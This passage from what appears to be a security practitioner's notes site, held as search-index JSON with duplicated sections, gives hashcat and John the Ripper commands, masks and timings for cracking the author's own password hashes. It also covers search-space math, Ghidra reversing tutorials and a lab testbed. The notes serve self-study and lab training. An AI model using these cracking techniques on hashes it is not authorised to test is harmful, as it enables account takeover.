(`$ ./hashcat.bin -O -w 3 hash2 rockyou.txt) exhausted the list in 2:38 with a rate of 90,525 H/s using a mask attack (no wordlist) is seeing a hash rate of around 110 kH/s $ ./hashcat.bin -O -w 3 -m 1800 -a 3 -1 ?l -2 ?l?d hash2 ?1?2?2?2?2?2?2?1 tried a very targeted (cheating) mask based on what I know of how the password is formed ?l?d?l?d?l?d?l?l you can benchmark your system for a particular hash: $ ./hashcat.bin -b -m 1800 . Mine claims 114.5 kH/s. -m 1800 is sha512crypt with 5000 iterations (e.g. $6$ ) setting the mask to exactly what the password has (cheating), allowed the crack to finish in 8:20:00, after having made it through 27.86% of the search space. The speedd averaged 111.6 kH/s. The command run was: ./hashcat.bin -O -w 3 -m 1800 -a 3 hash2 ?l?d?l?d?l?d?l?l Next, we tried \"loosening\" it a bit, to see what we learn perf-wise: ./hashcat.bin -O -w 3 -m 1800 -a 3 -1 ?l -2 ?l?d hash2 ?1?2?1?2?1?2?1?1 . The estimate is that it will take 54 days to exhaust the search space.","title":"HashCat"},{"location":"skills/passwords/hashcat.html#hashcat","text":"HashCat has alot of options. It is really worth taking time to read through the docs if you want to actually use the tool productively. Tip If you want to keep an eye on your NVIDIA GPUs while they are busy cracking passwords, you can get the equivalent of htop running a command similar to the following: $ watch -d -n 0.5 nvidia-smi . In this case it runs the nvidia-smi utility every half second ( -n 0.5 ), leaves it \"in place\" ( watch ) (so your screen isn't constantly scrolling) and higlights the values that change between refreshes ( -d )","title":"HashCat"},{"location":"skills/passwords/hashcat.html#random-notes-to-be-incorporated","text":"the pattern-based approach is called a \"mask attack\" - more info is available here: https://hashcat.net/wiki/doku.php?id=mask_attack we might want to create custom word-lists: https://infinitelogins.com/2020/11/16/using-hashcat-rules-to-create-custom-wordlists/ I did some testing to compare, and (where appropriate), it seems that the mask-attack is more performant (hashes/sec) than a wordlist (though it might not be successful). using a non-optimized command (`$ ./hascat.bin -m 1800 hash2 rockyou.txt) exhausted the list in 12:08 at a rate of roughly 19,706 H/s using an optimized command (`$ ./hashcat.bin -O -w 3 hash2 rockyou.txt) exhausted the list in 2:38 with a rate of 90,525 H/s using a mask attack (no wordlist) is seeing a hash rate of around 110 kH/s $ ./hashcat.bin -O -w 3 -m 1800 -a 3 -1 ?l -2 ?l?d hash2 ?1?2?2?2?2?2?2?1 tried a very targeted (cheating) mask based on what I know of how the password is formed ?l?d?l?d?l?d?l?l you can benchmark your system for a particular hash: $ ./hashcat.bin -b -m 1800 . Mine claims 114.5 kH/s. -m 1800 is sha512crypt with 5000 iterations (e.g. $6$ ) setting the mask to exactly what the password has (cheating), allowed the crack to finish in 8:20:00, after having made it through 27.86% of the search space. The speedd averaged 111.6 kH/s. The command run was: ./hashcat.bin -O -w 3 -m 1800 -a 3 hash2 ?l?d?l?d?l?d?l?l Next, we tried \"loosening\" it a bit, to see what we learn perf-wise: ./hashcat.bin -O -w 3 -m 1800 -a 3 -1 ?l -2 ?l?d hash2 ?1?2?1?2?1?2?1?1 . The estimate is that it will take 54 days to exhaust the search space.","title":"Random Notes to be incorporated"},{"location":"skills/passwords/john.html","text":"John the Ripper (aka John) \u00b6 John is another password discovery tool that has been around for quite some time. You can start off by giving it very little, and it will try to do it's thing: $ ./john ~/Downloads/hash.md5 Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-opencl\" Use the \"--format=md5crypt-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash ( md5crypt, crypt ( 3 ) $1 $ ( and variants ) [ MD5 512 /512 AVX512BW 16x3 ]) Will run 16 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Almost done : Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:./password.lst Proceeding with incremental:ASCII 0g 0 :00:01:47 3 /3 0g/s 1092Kp/s 1092Kc/s 1092KC/s pm1LEN..pmbk2c You can see that I let it run for just a short while (< 2 minutes) and it had already exhausted the default word list and had moved on to a more brute-force approach. If we next try the all wordlist availble from Openwall , we get disappointing results: $ ./john --wordlist = $HOME /Downloads/all ~/Downloads/hash.md5 Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-opencl\" Use the \"--format=md5crypt-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash ( md5crypt, crypt ( 3 ) $1 $ ( and variants ) [ MD5 512 /512 AVX512BW 16x3 ]) Will run 16 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0 :00:00:03 DONE ( 2021 -09-21 15 :01 ) 0g/s 1169Kp/s 1169Kc/s 1169KC/s zhnets.. { ysrfk Session completed. In less than one second, it ran through all 5,014,958 entries in our word list and, having not found a match, gave up. But wait, isn't it supposed to be a little smarter than that? Can't it try some permutations? Yes... the key is that if you provide your own list, and you also want it to mangle the inputs, you need to enable the rules engine via --rules . If we do that, we still get sub-optimal results: $ ./john --wordlist = $HOME /Downloads/all --rules ~/Downloads/hash.md5 Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-opencl\" Use the \"--format=md5crypt-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash ( md5crypt, crypt ( 3 ) $1 $ ( and variants ) [ MD5 512 /512 AVX512BW 16x3 ]) Will run 16 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0 :00:02:25 DONE ( 2021 -09-21 15 :04 ) 0g/s 1074Kp/s 1074Kc/s 1074KC/s Zwychiting..Zyyeking Session completed. Here, it took about 2.5 minutes to test all of the default rules for each entry in the word list, but it still didn't find a match. You could go about crafting your own mangling rules, but we might also consider just having a better word list. Interestingly, if we provide it the rockyou.txt word list, the results come back nearly instantaneously: $ ./john --wordlist = $HOME /Downloads/rockyou.txt ~/Downloads/hash.md5 Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-opencl\" Use the \"--format=md5crypt-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash ( md5crypt, crypt ( 3 ) $1 $ ( and variants ) [ MD5 512 /512 AVX512BW 16x3 ]) Will run 16 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status pass1word ( ? ) 1g 0 :00:00:00 DONE ( 2021 -09-21 14 :47 ) 25 .00g/s 307200p/s 307200c/s 307200C/s pitufo..gamboa Use the \"--show\" option to display all of the cracked passwords reliably Session completed. # now we run the \"show\" command, and we see the following: $ ./john --show ~/Downloads/hash.md5 ?:pass1word 1 password hash cracked, 0 left Not too bad... with a good wordlist, the password was found in nearly unmeasureable time. I should also note, that the rockyou.txt word list has 14,344,391 entries... almost three times larger than the all list by Openwall. You might notice the (?) listed during the main run, as well as ?: proceeding the password in the output from the --show command. In both cases, that is because I didn't provide a \"normal\" passwd file that would have started with username:password:etc . If I had, it would have shown the username where the ? is shown above. Running the same command against the sha-512 version of our password hash produced the same results - it successfully recovered the password in less-than-measureable time. On a whim, I tried John against another password hash that I had. This time, I knew that it was 8 characters long, and consisted of only lower-case letters and numbers. In order to limit the search space, I customized john.conf such that the MinLen and MaxLen for the [Incremental:LowerNum] character set were both set to 8. Then, I ran the following command. Notice that I left the default word list but specified the LowerNum character set. $ ./john --incremental = lowernum.chr ~/Downloads/hash.8lowernum","title":"John the Ripper"},{"location":"skills/passwords/john.html#john-the-ripper-aka-john","text":"John is another password discovery tool that has been around for quite some time. You can start off by giving it very little, and it will try to do it's thing: $ ./john ~/Downloads/hash.md5 Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-opencl\" Use the \"--format=md5crypt-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash ( md5crypt, crypt ( 3 ) $1 $ ( and variants ) [ MD5 512 /512 AVX512BW 16x3 ]) Will run 16 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Almost done : Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:./password.lst Proceeding with incremental:ASCII 0g 0 :00:01:47 3 /3 0g/s 1092Kp/s 1092Kc/s 1092KC/s pm1LEN..pmbk2c You can see that I let it run for just a short while (< 2 minutes) and it had already exhausted the default word list and had moved on to a more brute-force approach. If we next try the all wordlist availble from Openwall , we get disappointing results: $ ./john --wordlist = $HOME /Downloads/all ~/Downloads/hash.md5 Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-opencl\" Use the \"--format=md5crypt-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash ( md5crypt, crypt ( 3 ) $1 $ ( and variants ) [ MD5 512 /512 AVX512BW 16x3 ]) Will run 16 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0 :00:00:03 DONE ( 2021 -09-21 15 :01 ) 0g/s 1169Kp/s 1169Kc/s 1169KC/s zhnets.. { ysrfk Session completed. In less than one second, it ran through all 5,014,958 entries in our word list and, having not found a match, gave up. But wait, isn't it supposed to be a little smarter than that? Can't it try some permutations? Yes... the key is that if you provide your own list, and you also want it to mangle the inputs, you need to enable the rules engine via --rules . If we do that, we still get sub-optimal results: $ ./john --wordlist = $HOME /Downloads/all --rules ~/Downloads/hash.md5 Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-opencl\" Use the \"--format=md5crypt-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash ( md5crypt, crypt ( 3 ) $1 $ ( and variants ) [ MD5 512 /512 AVX512BW 16x3 ]) Will run 16 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0 :00:02:25 DONE ( 2021 -09-21 15 :04 ) 0g/s 1074Kp/s 1074Kc/s 1074KC/s Zwychiting..Zyyeking Session completed. Here, it took about 2.5 minutes to test all of the default rules for each entry in the word list, but it still didn't find a match. You could go about crafting your own mangling rules, but we might also consider just having a better word list. Interestingly, if we provide it the rockyou.txt word list, the results come back nearly instantaneously: $ ./john --wordlist = $HOME /Downloads/rockyou.txt ~/Downloads/hash.md5 Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-long\" Use the \"--format=md5crypt-long\" option to force loading these as that type instead Warning: detected hash type \"md5crypt\" , but the string is also recognized as \"md5crypt-opencl\" Use the \"--format=md5crypt-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash ( md5crypt, crypt ( 3 ) $1 $ ( and variants ) [ MD5 512 /512 AVX512BW 16x3 ]) Will run 16 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status pass1word ( ? ) 1g 0 :00:00:00 DONE ( 2021 -09-21 14 :47 ) 25 .00g/s 307200p/s 307200c/s 307200C/s pitufo..gamboa Use the \"--show\" option to display all of the cracked passwords reliably Session completed. # now we run the \"show\" command, and we see the following: $ ./john --show ~/Downloads/hash.md5 ?:pass1word 1 password hash cracked, 0 left Not too bad... with a good wordlist, the password was found in nearly unmeasureable time. I should also note, that the rockyou.txt word list has 14,344,391 entries... almost three times larger than the all list by Openwall. You might notice the (?) listed during the main run, as well as ?: proceeding the password in the output from the --show command. In both cases, that is because I didn't provide a \"normal\" passwd file that would have started with username:password:etc . If I had, it would have shown the username where the ? is shown above. Running the same command against the sha-512 version of our password hash produced the same results - it successfully recovered the password in less-than-measureable time. On a whim, I tried John against another password hash that I had. This time, I knew that it was 8 characters long, and consisted of only lower-case letters and numbers. In order to limit the search space, I customized john.conf such that the MinLen and MaxLen for the [Incremental:LowerNum] character set were both set to 8. Then, I ran the following command. Notice that I left the default word list but specified the LowerNum character set. $ ./john --incremental = lowernum.chr ~/Downloads/hash.8lowernum","title":"John the Ripper (aka John)"},{"location":"skills/passwords/searchspace.html","text":"Search Space Calculations \u00b6 Basic Combinatorics \u00b6 While I was working through some of these tests, I began do want to do some calculations to predict cracking completion time and to understand the implications of increasing (or decreasing) knowledge of the requirements for a given password. The most general form of the calculation is \\(x^y\\) where \\(x\\) is the number of candidate characters in the selected alphabet, and \\(y\\) is the length of the password. As an example, an 8-character password that uses characters in a..z0..9 would have a search space of \\(36^8\\) or \\(2.82 \\times 10^{12}\\) potential passwords. Confirming this, if you run the maskprocessor utility from the hashcat suite, you will confirm this: $ ./mp64.bin -1 ?l?d ?1?1?1?1?1?1?1?1 --combinations 2821109907456 However , if you visit the respected GRC Password Haystacks page and enter a similarly-styled password (e.g. a9a9a9a9 ), you will get an answer of \\(2.90 \\times 10^{12}\\) . At first, this might not seem like it is that different, but if you compare the raw numbers, there is a difference of over 80 billion ( \\(8.06 \\times 10^{10}\\) ) candidates. This appears to be quite a significant difference of opinion . After digging in a little, howevever, the rationale becomes quite clear, and the calcuations are (in principle) the same - it is just that the GRC calculator assumes not only the search space for an 8-character password, but also a 7-character password, and 6-characters, etc. As such, the GRC solution uses a formula such as \\(x^y + x^{y-1} + x^{y-2} + ... + x^{1}\\) . Depending on how you view things, the GRC equation is more complete and makes no assumptions as to the actual length of the password. If, however, you know that the password is exactly \\(y\\) characters long (e.g. 8 in this scenario), the equation simplifies to that used by the maskprocessor in hashcat ( \\(x^y\\) ). As you have increasing knowledge about specific details of the password (e.g. rules/limitations to character sets), the less accurate the generalized GRC calculation will be and the more important it will be to calculate the search space explicitly. Let's take our 8-character password from above... if we additionally know not only its length and that it uses a..z0..9 , but maybe we additionally know that it must have 3 characters from 0..9 and, therefore 5 characters from a..z . This leads to two different values for \\(x\\) in our formula above, 10 and 26 . Therefore, we could calculate the entire search space as \\(10^3 \\times 26^5 = 11,881,376,000 = 1.19 \\times 10^{10}\\) . But wait a minute you say, this makes an assumption that we also know which positions in the password must be numbers. If we don't, it could be equally possible to be any position, leading us back to the \\(x^y\\) space. Character Sets and Length \u00b6 Let's consider for a moment, the impact of both the size of your character set as well as the length of the password. To start out, the following figure shows a password of length 1-4 for various character sets: A couple of key items to point out in this figure include: The y-axis scale is logrithmic . This means that each major tickmark is an order of magnitude (10x larger) than the prior major line. So, while the data in this figure appears linear, it is actually increasing logrithmically. If this were plotted on a non-logrithmic scale, the values for length == 4 would be so much larger length == 3 , everything would appear as a nearly straight line prior. An example of this is provided here . Stating the obvious, but each character added to the password drastically increases the search space, even if the available character set is limited. Adding 1 additional character to a password consisting just of the numbers 0..9 increases the search space by an order of magnitude. The increase is more stark the further complicated the character set becomes. Given a password length of 4, the digit-only option has 100,000 possible passwords. On the other end of the spectrum, the mixed case, digits and special characters option has 7,737,809,375 possible combinations - over 7.7 billion more than the digit-based version. If we take the chart out to a password length of 8, we consider the following figure: We here see that the pattern for each of the character sets continues as expected. The gaps between a simple set (e.g. 0..9 ) and a complex set including mixed case, numbers and special characters grows. For our most complex set, we have now jumped to a search space of over \\(63 \\times 10^{16}\\) or 630 quadrillion candidates. Our final version of the chart simply drives home what we now know: long passwords with complex character sets have very large search spaces, and each additional character in the password greatly increases that space. Pre-Computing Lists \u00b6 On the overview page we discuss password lists and the value they provide. Given this, one may wonder if when using a mask-based or brute-force attack, is there value in pre-computing the list of candidates that would then be hashed in an attempt to match the target hash. The short answer is no . The longer answer is that, assuming there is not an overly complex set of rules needed to generate your candidates, the size of the resulting files would quickly become a barrier to efficient cracking operations. For example, if you assume a modest-length password of 8, and the simplest character set ( 0..9 ), the pre-computed word list will be 858M. If, however, you are targeting a password with a complex character set, the word list will be approximately 53 PiB (yes, Pebibytes ). The sheer delays caused by disk I/O would be overwhelming, not to mention needing to move that data around, divy it up amongst processors, etc. It becomes far simplier to define the approach, and then let the processor generate the permutations.","title":"Search Space"},{"location":"skills/passwords/searchspace.html#search-space-calculations","text":"","title":"Search Space Calculations"},{"location":"skills/passwords/searchspace.html#basic-combinatorics","text":"While I was working through some of these tests, I began do want to do some calculations to predict cracking completion time and to understand the implications of increasing (or decreasing) knowledge of the requirements for a given password. The most general form of the calculation is \\(x^y\\) where \\(x\\) is the number of candidate characters in the selected alphabet, and \\(y\\) is the length of the password. As an example, an 8-character password that uses characters in a..z0..9 would have a search space of \\(36^8\\) or \\(2.82 \\times 10^{12}\\) potential passwords. Confirming this, if you run the maskprocessor utility from the hashcat suite, you will confirm this: $ ./mp64.bin -1 ?l?d ?1?1?1?1?1?1?1?1 --combinations 2821109907456 However , if you visit the respected GRC Password Haystacks page and enter a similarly-styled password (e.g. a9a9a9a9 ), you will get an answer of \\(2.90 \\times 10^{12}\\) . At first, this might not seem like it is that different, but if you compare the raw numbers, there is a difference of over 80 billion ( \\(8.06 \\times 10^{10}\\) ) candidates. This appears to be quite a significant difference of opinion . After digging in a little, howevever, the rationale becomes quite clear, and the calcuations are (in principle) the same - it is just that the GRC calculator assumes not only the search space for an 8-character password, but also a 7-character password, and 6-characters, etc. As such, the GRC solution uses a formula such as \\(x^y + x^{y-1} + x^{y-2} + ... + x^{1}\\) . Depending on how you view things, the GRC equation is more complete and makes no assumptions as to the actual length of the password. If, however, you know that the password is exactly \\(y\\) characters long (e.g. 8 in this scenario), the equation simplifies to that used by the maskprocessor in hashcat ( \\(x^y\\) ). As you have increasing knowledge about specific details of the password (e.g. rules/limitations to character sets), the less accurate the generalized GRC calculation will be and the more important it will be to calculate the search space explicitly. Let's take our 8-character password from above... if we additionally know not only its length and that it uses a..z0..9 , but maybe we additionally know that it must have 3 characters from 0..9 and, therefore 5 characters from a..z . This leads to two different values for \\(x\\) in our formula above, 10 and 26 . Therefore, we could calculate the entire search space as \\(10^3 \\times 26^5 = 11,881,376,000 = 1.19 \\times 10^{10}\\) . But wait a minute you say, this makes an assumption that we also know which positions in the password must be numbers. If we don't, it could be equally possible to be any position, leading us back to the \\(x^y\\) space.","title":"Basic Combinatorics"},{"location":"skills/passwords/searchspace.html#character-sets-and-length","text":"Let's consider for a moment, the impact of both the size of your character set as well as the length of the password. To start out, the following figure shows a password of length 1-4 for various character sets: A couple of key items to point out in this figure include: The y-axis scale is logrithmic . This means that each major tickmark is an order of magnitude (10x larger) than the prior major line. So, while the data in this figure appears linear, it is actually increasing logrithmically. If this were plotted on a non-logrithmic scale, the values for length == 4 would be so much larger length == 3 , everything would appear as a nearly straight line prior. An example of this is provided here . Stating the obvious, but each character added to the password drastically increases the search space, even if the available character set is limited. Adding 1 additional character to a password consisting just of the numbers 0..9 increases the search space by an order of magnitude. The increase is more stark the further complicated the character set becomes. Given a password length of 4, the digit-only option has 100,000 possible passwords. On the other end of the spectrum, the mixed case, digits and special characters option has 7,737,809,375 possible combinations - over 7.7 billion more than the digit-based version. If we take the chart out to a password length of 8, we consider the following figure: We here see that the pattern for each of the character sets continues as expected. The gaps between a simple set (e.g. 0..9 ) and a complex set including mixed case, numbers and special characters grows. For our most complex set, we have now jumped to a search space of over \\(63 \\times 10^{16}\\) or 630 quadrillion candidates. Our final version of the chart simply drives home what we now know: long passwords with complex character sets have very large search spaces, and each additional character in the password greatly increases that space.","title":"Character Sets and Length"},{"location":"skills/passwords/searchspace.html#pre-computing-lists","text":"On the overview page we discuss password lists and the value they provide. Given this, one may wonder if when using a mask-based or brute-force attack, is there value in pre-computing the list of candidates that would then be hashed in an attempt to match the target hash. The short answer is no . The longer answer is that, assuming there is not an overly complex set of rules needed to generate your candidates, the size of the resulting files would quickly become a barrier to efficient cracking operations. For example, if you assume a modest-length password of 8, and the simplest character set ( 0..9 ), the pre-computed word list will be 858M. If, however, you are targeting a password with a complex character set, the word list will be approximately 53 PiB (yes, Pebibytes ). The sheer delays caused by disk I/O would be overwhelming, not to mention needing to move that data around, divy it up amongst processors, etc. It becomes far simplier to define the approach, and then let the processor generate the permutations.","title":"Pre-Computing Lists"},{"location":"skills/re/ghidra.html","text":"Ghidra \u00b6 Ghidra is \"a software reverse engineering (SRE) suite of tools developed by NSA's Research Directorate in support of the Cybersecurity mission\". It was released as free and open source a few years ago ( https://ghidra-sre.org/ ) and has exposed binary reverse engineering to many world-wide who would otherwise be unable to afford commercial tools such as IDA Pro. I followed the installation instructions and left the version in ~/Downloads/ghidra_10.1.1_PUBLIC . Included with the distribution of Ghidra are some tutorials <installdir>/docs/GhidraClass . There are four classes available, ranging from beginner to advanced. Tutorials \u00b6 Beginner \u00b6 Install and Introduction Creating Projects wrote my own little C program to use as the example program: // Simple C program to display \"Hello World\" // Header file for input output functions #include <stdio.h> // Add a global to see how it shows up int MYGLOBAL ; // main function int main () { printf ( \"Hello World \\n \" ); // local variables int a , b ; // interact with the global variable a = 10 ; b = 20 ; MYGLOBAL = a + b ; printf ( \"Value of a = %d, b = %d, and MYGLOBAL = %d \\n \" , a , b , MYGLOBAL ); return 0 ; } I then build the program using the following, rather standard commands: gcc helloworld.c -o helloworld Importing/Exporting Programs One thing I have failed to do in the past is the Options -> Load External Libraries option... this was helpful as it picked up libc.so.6 . My guess is that this would be particularly helpful when evaluating an entire firmware(?) Customizing Tools Basic Code Analysis Recommendation: take a layered approach. Do simple \"auto analysis\" first and then run \"one-shots\" later Learn how to recognize and fix problems (use scripts) - This is a skill I need! It was interesting to see how Ghidra decompiled my program... undefined8 main ( void ) { puts ( \"Hello World\" ); MYGLOBAL = 0x1e ; printf ( \"Value of a = %d, b = %d, and MYGLOBAL = %d \\n \" , 10 , 0x14 , 0x1e ); return 0 ; } The compiler auto-optimized out the local variables. Ghidra used the hex-representation of some of the integers. One key I picked up from the notes is that if, rather than individually closing all of the windows/tools to close ghidra, you instead choose File --> Exit Ghidra , it will save the state of all of your windows/tools and when you next launch the program, you will return to the same position. After a bit of cleanup, the decompilation looks more like this: int main ( void ) { puts ( \"Hello World\" ); MYGLOBAL = 30 ; printf ( \"Value of a = %d, b = %d, and MYGLOBAL = %d \\n \" , 10 , 20 , 30 ); return 0 ; } interestingly , as I looked at the disassembly, I noticed that the compiler had not optimized out the locals, but rather Ghidra simply did in the decompilation step. Notice the \"undefined\" stack items in the code block below... additionally, at 0x00101181 and again at 0x00101188 , you see values being assigned to those locals, followed by the addition operation at 0x00101195 and the assignment to the global at 0x00101197 . This is all lost in decompilation. Warning I spent way too much time here, trying to figure out why ghidra's decompilation wouldn't match the disassembly. Further, I tried to see if there was a way in which I could, having analyzed the disassembly, force the decompilation to be better, yet to no avail. I need to look at this more later. Selections Basic code Markup Basic Decompiler Applying Data Types Navigation Searching Byte Viewer Basic Program Tree Symbol Table/Tree Function Graph Function Call Tree","title":"Ghidra"},{"location":"skills/re/ghidra.html#ghidra","text":"Ghidra is \"a software reverse engineering (SRE) suite of tools developed by NSA's Research Directorate in support of the Cybersecurity mission\". It was released as free and open source a few years ago ( https://ghidra-sre.org/ ) and has exposed binary reverse engineering to many world-wide who would otherwise be unable to afford commercial tools such as IDA Pro. I followed the installation instructions and left the version in ~/Downloads/ghidra_10.1.1_PUBLIC . Included with the distribution of Ghidra are some tutorials <installdir>/docs/GhidraClass . There are four classes available, ranging from beginner to advanced.","title":"Ghidra"},{"location":"skills/re/ghidra.html#tutorials","text":"","title":"Tutorials"},{"location":"skills/re/ghidra.html#beginner","text":"Install and Introduction Creating Projects wrote my own little C program to use as the example program: // Simple C program to display \"Hello World\" // Header file for input output functions #include <stdio.h> // Add a global to see how it shows up int MYGLOBAL ; // main function int main () { printf ( \"Hello World \\n \" ); // local variables int a , b ; // interact with the global variable a = 10 ; b = 20 ; MYGLOBAL = a + b ; printf ( \"Value of a = %d, b = %d, and MYGLOBAL = %d \\n \" , a , b , MYGLOBAL ); return 0 ; } I then build the program using the following, rather standard commands: gcc helloworld.c -o helloworld Importing/Exporting Programs One thing I have failed to do in the past is the Options -> Load External Libraries option... this was helpful as it picked up libc.so.6 . My guess is that this would be particularly helpful when evaluating an entire firmware(?) Customizing Tools Basic Code Analysis Recommendation: take a layered approach. Do simple \"auto analysis\" first and then run \"one-shots\" later Learn how to recognize and fix problems (use scripts) - This is a skill I need! It was interesting to see how Ghidra decompiled my program... undefined8 main ( void ) { puts ( \"Hello World\" ); MYGLOBAL = 0x1e ; printf ( \"Value of a = %d, b = %d, and MYGLOBAL = %d \\n \" , 10 , 0x14 , 0x1e ); return 0 ; } The compiler auto-optimized out the local variables. Ghidra used the hex-representation of some of the integers. One key I picked up from the notes is that if, rather than individually closing all of the windows/tools to close ghidra, you instead choose File --> Exit Ghidra , it will save the state of all of your windows/tools and when you next launch the program, you will return to the same position. After a bit of cleanup, the decompilation looks more like this: int main ( void ) { puts ( \"Hello World\" ); MYGLOBAL = 30 ; printf ( \"Value of a = %d, b = %d, and MYGLOBAL = %d \\n \" , 10 , 20 , 30 ); return 0 ; } interestingly , as I looked at the disassembly, I noticed that the compiler had not optimized out the locals, but rather Ghidra simply did in the decompilation step. Notice the \"undefined\" stack items in the code block below... additionally, at 0x00101181 and again at 0x00101188 , you see values being assigned to those locals, followed by the addition operation at 0x00101195 and the assignment to the global at 0x00101197 . This is all lost in decompilation. Warning I spent way too much time here, trying to figure out why ghidra's decompilation wouldn't match the disassembly. Further, I tried to see if there was a way in which I could, having analyzed the disassembly, force the decompilation to be better, yet to no avail. I need to look at this more later. Selections Basic code Markup Basic Decompiler Applying Data Types Navigation Searching Byte Viewer Basic Program Tree Symbol Table/Tree Function Graph Function Call Tree","title":"Beginner"},{"location":"skills/re/virtual_funcs.html","text":"Reversing Virtual Functions \u00b6 The following is a Ghidra-specific walk through of https://alschwalm.com/blog/static/2016/12/17/reversing-c-virtual-functions/ #include <cstdlib> #include <iostream> struct Mammal { Mammal () { std :: cout << \"Mammal::Mammal \\n \" ; } virtual ~ Mammal () { std :: cout << \"Mammal::~Mammal \\n \" ; } virtual void run () = 0 ; virtual void walk () = 0 ; virtual void move () { walk ();} }; struct Cat : Mammal { Cat () { std :: cout << \"Cat::Cat \\n \" ; } virtual ~ Cat () { std :: cout << \"Cat::~Cat \\n \" ; } virtual void run () { std :: cout << \"Cat::run \\n \" ; } virtual void walk () { std :: cout << \"Cat::walk \\n \" ; } }; struct Dog : Mammal { Dog () { std :: cout << \"Dog::Dog \\n \" ; } virtual ~ Dog () { std :: cout << \"Dog::~Dog \\n \" ; } virtual void run () { std :: cout << \"Dog::run \\n \" ; } virtual void walk () { std :: cout << \"Dog::walk \\n \" ; } }; int main ( int argc , char ** argv ) { Mammal * m ; if ( rand () % 2 ) { m = new Cat (); } else { m = new Dog (); } m -> walk (); delete m ; return 0 ; } g++ -m32 -fno-rtti -fno-exceptions -O1 reversing1.cpp -o reversing1 strip reversing1 file reversing1 reversing1: ELF 32 -bit LSB shared object, Intel 80386 , version 1 ( SYSV ) , \\ dynamically linked, interpreter /lib/ld-linux.so.2, BuildID [ sha1 ] \\ = a0458157cf642fb4a793d7c402728b8771fe309d, for GNU/Linux 3 .2.0, stripped","title":"Virtual Functions"},{"location":"skills/re/virtual_funcs.html#reversing-virtual-functions","text":"The following is a Ghidra-specific walk through of https://alschwalm.com/blog/static/2016/12/17/reversing-c-virtual-functions/ #include <cstdlib> #include <iostream> struct Mammal { Mammal () { std :: cout << \"Mammal::Mammal \\n \" ; } virtual ~ Mammal () { std :: cout << \"Mammal::~Mammal \\n \" ; } virtual void run () = 0 ; virtual void walk () = 0 ; virtual void move () { walk ();} }; struct Cat : Mammal { Cat () { std :: cout << \"Cat::Cat \\n \" ; } virtual ~ Cat () { std :: cout << \"Cat::~Cat \\n \" ; } virtual void run () { std :: cout << \"Cat::run \\n \" ; } virtual void walk () { std :: cout << \"Cat::walk \\n \" ; } }; struct Dog : Mammal { Dog () { std :: cout << \"Dog::Dog \\n \" ; } virtual ~ Dog () { std :: cout << \"Dog::~Dog \\n \" ; } virtual void run () { std :: cout << \"Dog::run \\n \" ; } virtual void walk () { std :: cout << \"Dog::walk \\n \" ; } }; int main ( int argc , char ** argv ) { Mammal * m ; if ( rand () % 2 ) { m = new Cat (); } else { m = new Dog (); } m -> walk (); delete m ; return 0 ; } g++ -m32 -fno-rtti -fno-exceptions -O1 reversing1.cpp -o reversing1 strip reversing1 file reversing1 reversing1: ELF 32 -bit LSB shared object, Intel 80386 , version 1 ( SYSV ) , \\ dynamically linked, interpreter /lib/ld-linux.so.2, BuildID [ sha1 ] \\ = a0458157cf642fb4a793d7c402728b8771fe309d, for GNU/Linux 3 .2.0, stripped","title":"Reversing Virtual Functions"},{"location":"testbed/index.html","text":"Portable Testbed \u00b6 While many things can (and should) be virtualized, I wanted to build a small testbed wherein I could validate not only my logical access to various things, but also confirm some physical attacks/interactions. Additionally, this will allow others in my team to participate and train once I get a few of the kinks worked out. This section of the documentation describes the environment and some of the uses. Testbed Layout \u00b6 Router \u00b6 The network router in the testbed is an used Netgear Nighthawk R7000 . The extnernal/WAN interface is intended to be connected to whatever local network you are working on and the router should provide a reasonable level of isolation between your LAN and the possibly vulnerable machines inside the testbed. Configuration \u00b6 Firmware Version: V1.0.11.106_10.2.100 Username: admin Password: standard lab password Internal IP: 192.168.89.1 Switch \u00b6 We decided to use a Netgear GS724T 24-Port switch as the primary backbone for the testbed. We had one available and it allows us to, should we choose, configure a span port for traffic monitoring. Configuration \u00b6 Firmware Version: 